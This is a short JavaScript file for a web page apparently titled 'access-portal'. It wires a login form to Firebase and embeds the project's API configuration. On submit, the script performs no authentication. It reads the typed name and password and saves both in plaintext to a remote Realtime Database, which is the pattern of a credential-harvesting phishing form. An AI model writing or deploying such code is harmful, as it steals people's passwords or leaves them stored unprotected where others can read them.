const firebaseConfig = {
    apiKey: "AIzaSyAWChnn-lVgzf4zAc95N6xqw2_fZmm6lPE",
    authDomain: "access-portal-6b141.firebaseapp.com",
    databaseURL: "https://access-portal-6b141-default-rtdb.firebaseio.com",
    projectId: "access-portal-6b141",
    storageBucket: "access-portal-6b141.appspot.com",
    messagingSenderId: "892165109811",
    appId: "1:892165109811:web:9414ed74fef257849b8b46",
    measurementId: "G-6KD5HF2WWV"
  };

  //initialize firebase
  firebase.initializeApp(firebaseConfig);

  //reference your database
  var loginFormDB = firebase.database().ref('loginForm');

  document.getElementById('loginForm').addEventListener('submit',submitForm);

  function submitForm(e){
    e.preventDefault();

    var name = getElementVal("name");
    var password = getElementVal("password");

    saveMessages(name,password);
    
    //reset the form
    document.getElementById('loginForm').reset();
  }
  const saveMessages = (name,password)=>{
      var newLoginForm = loginFormDB.push();

      newLoginForm.set({
        name : name,
        password : password,
      });
  }

  const getElementVal = (id)=>{
    return document.getElementById(id).value;
  }


